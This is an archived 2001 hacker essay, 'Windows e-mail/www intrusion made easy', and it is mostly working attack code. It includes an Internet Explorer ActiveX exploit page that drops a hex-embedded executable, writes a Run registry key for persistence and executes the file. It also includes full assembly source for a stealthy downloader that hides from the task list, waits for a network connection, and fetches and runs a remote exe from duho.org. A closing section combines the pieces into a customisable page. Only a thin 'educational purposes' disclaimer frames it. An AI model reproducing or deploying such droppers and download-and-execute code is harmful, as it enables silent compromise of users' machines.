
<!-- HTML downloaded from WWW.BYTERAGE.CJB.NET (ELF.BOX.SK/BYTERAGE) -->

<HTML>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<BODY TEXT="#AABBCC" LINK="#0000ff" VLINK="#800080" BGCOLOR="#000000">
<P><H2>Windows e-mail/www intrusion made easy</H2> ~ essay (C) 2001 by [ByteRage] (byterage@yahoo.com / www.byterage.cjb.net)</P>
<HR>
<P><H2>Abstract</H2>
Somewhere in the year 2000, I released a program called EXE2HTML, a program with the sole purpose to put an EXE file (max. size 64K) in an HTML and extract & run it on next startup on windows machines. The program was based on an exploit written by Georgi Guninski, and would work on all versions of windows (with some adaptions) with Internet Explorer 5.0. You can still read about this project <A HREF="winbug.htm">HERE</A> (I left it on the site for educational purposes) however, in this text I will provide you with more advanced and more versatile techniques for intrusion of windows systems. What we will be creating is the following : an HTML page that will escalate privileges on load to drop a small 8K executable (asm c0de) on the target (filedata embedded in HTML), create a key for it to run on next startup (win9x/NT), it may execute it on page load, or wait for next startup. Then the small exe will hide itself from the win9x tasklist (if possible), wait for an internet connection and download an external file and execute it. All this might well happen in about 5 seconds, it might have happened NOW.<BR>ph34r...</P>
<HR>
<P><H2>Disclaimer</H2>
This paper is intended for educational purposes only. The links to source code and tools within this document are for educational purposes only and are provided solely to further the insight of the reader into the topic. The author is not responsible for any use or misuse of the information described in this document.</P>
<HR>
<P><H2>Sample HTML Page</H2>
This <A HREF="sample.zip">zipped up sample HTML page</A> will attempt to download and execute http://www.duho.org/eatme.exe (some old version of notepad.exe) either now, or if you're not connected, waiting for a connection or waiting for next startup and waiting for a connection, etc... Suffice to say that it will get downloaded & executed :) It will create the following key : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\win386, to ensure d/l & execution. This is all the inf0z I want to give about this sample, if you feel to stupid to understand then don't load the page or only watch the source, however the page has no malicious intent (unless of course the people at DuHo replace the exe...).</P>
<HR>
<P><H2>How it works & source c0dez</H2>
Eyeball the following HTML c0de for a while (c0de supplied to me by Phr0zen, original exploit by Guninski) :

<FONT COLOR="#00FF00">
<PRE>
&ltHTML&gt
&ltBODY&gt
&ltAPPLET code="com.ms.activeX.ActiveXComponent" WIDTH=0 HEIGHT=0&gt&lt/APPLET&gt
&lt!-- ^^^ This gives java exceptions in java console, but the object is instantiated --&gt
&ltSCRIPT LANGUAGE="JAVASCRIPT"&gt
&lt!-- hide for safe browsers

InterfaceObject=document.applets[0];
setTimeout("Upload()",1000);

function Upload() {
	fsoClassID="{0D43FE01-F093-11CF-8940-00A0C9054228}";
	InterfaceObject.setCLSID(fsoClassID);
	fso = InterfaceObject.createInstance();
	// windir = fso.getspecialfolder(0);
        filename = "\\exploit.exe";
	file = fso.opentextfile(filename, "2", "TRUE");
	file.write(FileContent);
	file.close();
	Run();
	}

function Run() {
        regkey = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\win386" 
        WshShellClassID="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}";
	InterfaceObject.setCLSID(WshShellClassID);
	wshShell = InterfaceObject.createInstance();
	wshShell.regwrite(regkey,filename)
	wshShell.run(filename,"6","TRUE");
	}

--&gt
&lt/SCRIPT&gt


&ltscript language="vbscript"&gt
&lt!-- hide for safe browsers
FileContent = array()
FileContent = "31323334"
FileContent = decode(FileContent)

Function Decode(Text)
        For x = 1 To Len(Text) Step 2
            thebyte = Chr(38) & "H" & Mid(Text, x, 2)
            temptext = temptext & Chr(thebyte)
        Next
        Decode = temptext
End Function
--&gt
&lt/script&gt
&lt/BODY&gt
&lt/HTML&gt
</PRE>
</FONT>
This c0de does the following : you can see "31323334", these are the hexadecimal values (2 chars represent one byte) that will form the binary file content of our dropped exe, which we call "\EXPLOIT.EXE", this file is created by the Upload(); function. Then you also see wshShell.regwrite(regkey,filename), this will write the key that will execute "\EXPLOIT.EXE" on next startup. You can also see wshShell.run(filename,"6","TRUE");, this is the line that will execute the "\EXPLOIT.EXE" directly...</P>
<P>Okay, this is nice, but we want to put the hexadecimal values for a file in the exploit, and we dont want to type this in by ourselves, so I created the following small QBasic script (the QBasic interpreter is somewhere on the windows CD, under oldtools\msdos or something), change some filenames and hit SHIFT+F5 to execute
<FONT COLOR="#00FF00">
<PRE>
OPEN "EXPLOIT.EXE" FOR BINARY AS #1
OPEN "OUT.TXT" FOR OUTPUT AS #2
A$ = " "
WHILE NOT EOF(1)
  GET #1, , A$
  B$ = HEX$(ASC(A$))
  IF LEN(B$) = 1 THEN B$ = "0" + B$
  PRINT #2, B$;
WEND
CLOSE
</PRE>
</FONT>
Enter this c0de in the QBasic interpreter and hit <SHIFT+F5> and EXPLOIT.EXE will get 'encoded' into hex values.
</P>
<P>
Now, what do we want the exe to look like ? let's make it a win32asm downloader proggie, like this :
<FONT COLOR="#00FF00">
<PRE>
;=====================================================================
; DOWNLOADER - [ByteRage] <byterage@yahoo.com>, www.byterage.cjb.net
;
; The program imports the WININET.DLL functions by itself, as I didn't
; want to get a *.LIB file for WININET.DLL from the net (like
; import32.lib)
;
; tasm32 -ml downloader.asm
; tlink32 -Tpe -c -x downloader.obj ,,, import32
;
; then add the following modifications :
; hiew downloader.exe, change byte at 15C from 03 to 01
;                      making it a native driver, so that it is only
;                      executable from windows but also STEALTH!
;                      (no console)
;
; - [ByteRage]
;
;=====================================================================

.386p
locals
jumps
.model flat, stdcall

extrn LoadLibraryA:PROC
extrn GetProcAddress:PROC
extrn GlobalAlloc:PROC
extrn GlobalFree:PROC
extrn Sleep:PROC
extrn CreateFileA:PROC
extrn WriteFile:PROC
extrn CloseHandle:PROC
extrn WinExec:PROC
extrn GetStartupInfoA:PROC
extrn CreateProcessA:PROC
extrn ExitProcess:PROC

; WSOCK32.DLL functions
extrn WSAStartup:PROC
extrn gethostname:PROC
extrn gethostbyname:PROC

extrn RegOpenKeyA:PROC
extrn RegDeleteValueA:PROC
extrn RegCloseKey:PROC

.data

;=====================================================================
; DATA USED BY DOWNLOADER MAIN PROGRAM
;=====================================================================

; the following vars are used for hiding from the tasklist in win9x
lib db 'KERNEL32',0
imp db 'RegisterServiceProcess',0 ; used for hiding from tasklist
                      ; I prefer loading the proc from the program, so
                      ; that I can check if the proc is available
                      ; because it is a win9x only thing

LoadLibraryLoc dd ?
GetProcAddressLoc dd ?

; used for intializing WINSOCKS
wsadescription_len equ 256
wsasys_status_len equ 128
WSAdata struct
wVersion dw ?
wHighVersion dw ?
szDescription db wsadescription_len+1 dup (?)
szSystemStatus db wsasys_status_len+1 dup (?)
iMaxSockets dw ?
iMaxUdpDg dw ?
lpVendorInfo dw ?
WSAdata ends
wsadata WSAdata ?

; used for checking for an internet connection
localhostname db 256 dup (0)
localhostnamelen EQU $-offset(localhostname)

; !!!! PARAMETERS !!!!
; the Download URL can be http/https/gopher/ftp whatever...
; !!!! SHOULD BE ADDED BY REST OF THE EXPLOIT CODE !!!!

DownloadURL db 32 dup ('PAR1')
;DownloadURL db 'http://www.duho.org/eatme.exe',0 ; <-- for testing
NewFileName db 32 dup ('PAR2')
;NewFileName db '/takeover.exe',0 ; <-- for testing
currdir db '/',0

UserAgent db '[ByteRage]',0 ; small insiders' joke :)
internethandle dd ?
internethandle2 dd ?

BufferStart dd ?
BytesRead dd ?
FileHandle dd ?

; the following vars are used for the WININET addresses
lib2 db 'WININET',0
impfunc db 'InternetOpenA',0
impfunc2 db 'InternetOpenUrlA',0
impfunc3 db 'InternetReadFile',0
impfunc4 db 'InternetCloseHandle',0
InternetOpenALoc dd ?
InternetOpenUrlALoc dd ?
InternetReadFileLoc dd ?
InternetCloseHandleLoc dd ?

StartupInfo dd 17 dup (0)
ProcessInfo dd 4 dup (0)

hKeyHKLM dd 080000002h
lKeyValue dd ?
section db 'Software\Microsoft\Windows\CurrentVersion\Run',0
subkey db 'win386',0

.code

;=====================================================================
; DOWNLOADER ENTRY POINT
;=====================================================================

import proc ptrlib:dword, ptrimp:dword

     push    ptrlib
     call    LoadLibraryA
     push    ptrimp
     push    eax
     call    GetProcAddress
     ret

endp

downloader:

; HIDE PROGRAM FROM THE WIN9X TASKLIST (JUST FOR THE HECK OF IT)

        push    offset lib      ; now I need the LoadLibraryA & GetProcAddress
        call    LoadLibraryA    ; for hiding it from the process list
        push    offset imp
        push    eax
        call    GetProcAddress
        cmp     eax, 0
        je      NoHiding        ; hiding not supported (probably NT)
        push    1               ; on error : skip
        push    0
        call    eax
NoHiding:

; INITIALIZE WINDOWS SOCKETS : SHOULD BE VERSION # 1.1

initsocks:

        push    offset wsadata  ; WSAStartup : check for Winsock 1.1
        push    0101h
        call    WSAStartup
        or      eax, eax
        jz      winsock_found

        jmp     initsocks       ; on error : try again

winsock_found:

TryAgain:

; WAIT FOR AN INTERNET CONNECTION (DOESN'T USE WININET.DLL)

WaitForConnection:
        push    localhostnamelen     ; Check if there's an internet
        push    offset localhostname ; connection : get the local hostname,
        call    gethostname          ; do a call to gethostbyname, then
        or      eax, eax             ; read out hostent structure to compare
        jnz     WaitForConnection    ; IP # with 127.0.0.1
        push    offset localhostname ; (technique also used by SubSeven)
        call    gethostbyname
        or      eax, eax
        jz      WaitForConnection    ; on error : try again
@@1:
        push    eax             ; read out hostent structure in a clean way
        mov     eax, dword ptr ds:[eax] ; even m$ doesnt follow the specs
        mov     ebx, dword ptr ds:[eax] ; in telnet.exe, so maybe this is too
        pop     eax             ; much code
        add     eax, 4
        cmp     ebx, 0
        jnz     @@1
        add     eax, 4
        mov     eax, ds:[eax]
        mov     eax, ds:[eax]
        mov     eax, ds:[eax]
        cmp     eax, 0100007Fh  ; 127.0.0.1
        jnz     StartDownload

        push    10000d               ; 10 sec. Delay
        call    Sleep

        jmp     WaitForConnection    ; if IP # = 127.0.0.1 : try again (wait)

StartDownload:

; CREATE TRANSFER BUFFER

CreateBuffer:
        push    04000h          ; Get 16K space for transfer buffer
        push    040h
        call    GlobalAlloc
        cmp     eax, 0
        jz      CreateBuffer    ; on error : try again
        mov     BufferStart, eax
 
; DOWNLOAD THE FILE USING WININET.DLL

Again:
        push    offset impfunc
        push    offset lib2
        call    import
        cmp     eax, 0
        jz      Again          ; on error : try again
        mov     InternetOpenALoc, eax
Again2:
        push    offset impfunc2
        push    offset lib2
        call    import
        cmp     eax, 0
        jz      Again2         ; on error : try again
        mov     InternetOpenUrlALoc, eax
Again3:
        push    offset impfunc3
        push    offset lib2
        call    import
        cmp     eax, 0
        jz      Again3         ; on error : try again
        mov     InternetReadFileLoc, eax
Again4:
        push    offset impfunc4
        push    offset lib2
        call    import
        cmp     eax, 0
        jz      Again4         ; on error : try again
        mov     InternetCloseHandleLoc, eax

        push    0
        push    0
        push    0
        push    0
        push    offset UserAgent
        call    InternetOpenALoc ; no error checking (pretty unlikely)
        mov     internethandle, eax

        push    0
        push    0
        push    0FFh
        push    0
        push    offset DownloadURL
        push    internethandle
        call    InternetOpenUrlALoc ; no error checking (pretty unlikely)
        mov     internethandle2, eax

Again5:
        push    0
        push    080h
        push    2
        push    0
        push    0
        push    0C0000000h
        push    offset NewFileName
        call    CreateFileA
        cmp     eax, -1
        jz      Again5
        mov     FileHandle, eax

NextBlock:
        push    offset BytesRead
        push    04000h
        push    BufferStart
        push    internethandle2
        call    InternetReadFileLoc
        cmp     BytesRead, 0
        jz      copied
        push    0
        push    offset BytesRead
        push    BytesRead
        push    BufferStart
        push    FileHandle
        call    WriteFile
        jmp     NextBlock
copied:

        push    internethandle
        call    InternetCloseHandleLoc

        push    internethandle2
        call    InternetCloseHandleLoc

        push    FileHandle
        call    CloseHandle

        push    BufferStart     ; Free 16K space for transfer buffer
        call    GlobalFree

exec:

; EXECUTE PROGRAM

        push    offset StartupInfo
        call    GetStartupInfoA

        ; Sets STARTF_USESHOWWINDOW & wShowWindow flags
        mov     dword ptr [StartupInfo+02Ch],01h
        mov     word ptr [StartupInfo+030h],01h

        push    offset ProcessInfo
        push    offset StartupInfo
        push    offset currdir
        push    0
        push    04000210h
        push    0
        push    0
        push    0
        push    offset NewFileName
        push    0
        call    CreateProcessA

; KILL STARTUP REGISTRY KEY

        push    offset lKeyValue
        push    offset section
        push    hKeyHKLM
        call    RegOpenKeyA

        push    offset subkey
        push    lKeyValue
        call    RegDeleteValueA
        
        push    lKeyValue
        call    RegCloseKey

; AND LEAVE...

        push    0
        call    ExitProcess

end     downloader

</PRE>
</FONT>
When we combine everything we have until now we get the following (19K) HTML :
<FONT COLOR="#00FF00">
<PRE>
&ltHTML&gt
&ltBODY&gt
&ltAPPLET code="com.ms.activeX.ActiveXComponent" WIDTH=0 HEIGHT=0&gt&lt/APPLET&gt
&lt!-- ^^^ This gives java exceptions in java console, but the object is instantiated --&gt
&ltSCRIPT LANGUAGE="JAVASCRIPT"&gt
&lt!-- hide for safe browsers

InterfaceObject=document.applets[0];
setTimeout("Upload()",1000);

function Upload() {
	fsoClassID="{0D43FE01-F093-11CF-8940-00A0C9054228}";
	InterfaceObject.setCLSID(fsoClassID);
	fso = InterfaceObject.createInstance();
	// windir = fso.getspecialfolder(0);
        filename = "\\exploit.exe";
	file = fso.opentextfile(filename, "2", "TRUE");
	file.write(FileContent);
	file.close();
	Run();
	}

function Run() {
        regkey = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\win386" 
        WshShellClassID="{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}";
	InterfaceObject.setCLSID(WshShellClassID);
	wshShell = InterfaceObject.createInstance();
	wshShell.regwrite(regkey,filename)
	wshShell.run(filename,"6","TRUE"); // YOU CAN CONSIDER LEAVING THIS LINE OUT, TO MAKE IT MORE STEALTH
                                           // DOWNLOADER WILL BE ACTIVE ON NEXT STARTUP (SIMILAR TO TROJAN)
                                           // BETTER MAKE WINDOW STYLE VISIBLE ("6", "TRUE")
	}

--&gt
&lt/SCRIPT&gt


&ltscript language="vbscript"&gt
&lt!-- hide for safe browsers
	FileContent = array()
'some hex bytes (maximum 64k = 32k executable), i'm going to expand this by
'using an array but I stil have to find something to create an vbscript array that's
'compatible with javascript (above)
FileContent=decode ("4D5A50000200000004000F00FFFF0000B80000000000000040001A00000000000000000000000000000000000000000000000000000000000000000000010000BA10000E1FB409CD21B8014CCD219090546869732070726F6772616D206D7573742062652072756E20756E6465722057696E33320D0A243700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000504500004C010400342ABB940000000000000000E0008E810B01021900040000000C000000000000191000000010000000200000000040000010000000020000010000000000000003000A00000000000050000000040000000000000100000000001000002000000000100000100000000000001000000000000000000000000030000022020000000000000000000000000000000000000000000000000000004000009C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000434F44450000000000100000001000000004000000060000000000000000000000000000200000604441544100000000001000000020000000060000000A0000000000000000000000000000400000C02E6964617461000000100000003000000004000000100000000000000000000000000000400000C02E72656C6F63000000100000004000000002000000140000000000000000000000000000400000500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C8000000FF7508E8A1020000FF750C50E886020000C9C208006800204000E88A020000680920400050E86D02000083F800740A909090906A016A00FFD068282040006801010000E8790200000BC0740690909090EBE7680001000068B4214000E8540200000BC075ED68B4214000E84C0200000BC074DF508B008B185883C00483FB0075F283C0048B008B008B003D7F0000017510909090906810270000E810020000EBB168004000006A40E8F001000083F80074EFA3C923400068DD23400068D5234000E836FFFFFF83F80074ECA32124400068EB23400068D5234000E81DFFFFFF83F80074ECA32524400068FC23400068D5234000E804FFFFFF83F80074ECA329244000680D24400068D5234000E8EBFEFFFF83F80074ECA32D2440006A006A006A006A0068B6234000FF1521244000A3C12340006A006A0068FF0000006A0068B4224000FF35C1234000FF1525244000A3C52340006A0068800000006A026A006A0068000000C06834234000E80F01000083F8FF74DFA3D123400068CD2340006800400000FF35C9234000FF35C5234000FF1529244000833DCD234000007424909090906A0068CD234000FF35CD234000FF35C9234000FF35D1234000E8B8000000EBB7FF35C1234000FF152D244000FF35C5234000FF152D244000FF35D1234000E88D000000FF35C9234000E8B20000006831244000E896000000C7055D2440000100000066C7056124400001006875244000683124400068B42340006A0068100200046A006A006A0068342340006A00E84F0000006889244000688D244000FF3585244000E87C00000068BB244000FF3589244000E872000000FF3589244000E86D0000006A00E81E000000FF25A4304000FF25A8304000FF25AC304000FF25B0304000FF25B4304000FF25B8304000FF25BC304000FF25C0304000FF25C4304000FF25C8304000FF25CC304000FF25D0304000FF25D8304000FF25DC304000FF25E0304000FF25E8304000FF25EC304000FF25F03040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004B45524E454C33320052656769737465725365727669636550726F6365737300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")

'WIN32ASM DOWNLOADER PARAMETER 1 : DOWNLOAD URL, DONT FORGET TO APPEND NULL !
FileContent=FileContent+"http://www.duho.org/eatme.exe"+chr(0)+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

'WIN32ASM DOWNLOADER PARAMETER 2 : TARGET LOCATION (incl. drive+path), DONT FORGET TO APPEND NULL !
FileContent=FileContent+"/takeover.exe"+chr(0)+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

FileContent=FileContent+decode("2F005B42797465526167655D00000000000000000000000000000000000000000057494E494E455400496E7465726E65744F70656E4100496E7465726E65744F70656E55726C4100496E7465726E65745265616446696C6500496E7465726E6574436C6F736548616E646C6500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200008000000000536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E0077696E33383600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000503000000000000000000000F8300000A430000084300000000000000000000005310000D830000094300000000000000000000011310000E830000000000000000000000000000000000000000000001E3100002831000036310000423100005031000062310000703100008231000094310000A2310000B0310000C031000000000000C8310000D6310000E631000000000000F43100000232000014320000000000001E3100002831000036310000423100005031000062310000703100008231000094310000A2310000B0310000C031000000000000C8310000D6310000E631000000000000F43100000232000014320000000000004B45524E454C33322E646C6C0057534F434B33322E646C6C0041445641504933322E646C6C00000057696E45786563000000436C6F736548616E646C65000000577269746546696C6500000043726561746546696C654100000043726561746550726F6365737341000000004578697450726F6365737300000047657453746172747570496E666F4100000047657450726F634164647265737300000000476C6F62616C416C6C6F63000000476C6F62616C46726565000000004C6F61644C6962726172794100000000536C656570000000676574686F73746E616D65000000676574686F737462796E616D6500000057534153746172747570000000005265674F70656E4B65794100000052656744656C65746556616C756541000000526567436C6F73654B65790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000009C0000001A3024303E305C306A30B730BC30C130D030D530DA30E930EE30F330023107310C311B3128312E313331433149314F3154316B317A317F318A31903196319C31AA31B031B631BC31C931CF31D531DB31E131EC31F63101320C32133218321D322F323B3240324632503256326132733279327F3285328B32913297329D32A332A932AF32B532BB32C132C732CD32D332D932000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")

Function Decode(Text)
    For x = 1 To Len(Text) Step 2
        thebyte = Chr(38) & "H" & Mid(Text, x, 2)
        temptext = temptext & Chr(thebyte)
	Next
        Decode = temptext
End Function
--&gt
&lt/script&gt

&lt/BODY&gt
&lt/HTML&gt
</PRE>
</FONT>
This is also the sample HTML page as given in the zip. As you can see the parameters to the WIN32ASM prog are customizable, so enjoy :) You have to keep the length of the parameters fixed though, thus shrinking the padding string of As when you make the Download URL/Target Location string longer.
</P>
<HR>
<P><H2>Greetz & Thanks</H2>
the people at <a href="http://www.DuHo.org">www.DuHo.org</A> for making me realize the impact of the exploit, also check out their projects page<BR>
and more in particular <a href="phr0zen@mail.be">Phr0zen</A>, who did alot of the vbscript & javascript coding</P>
<HR>
<CENTER><A HREF="index.html">BACK</A></CENTER>
</BODY>
</HTML>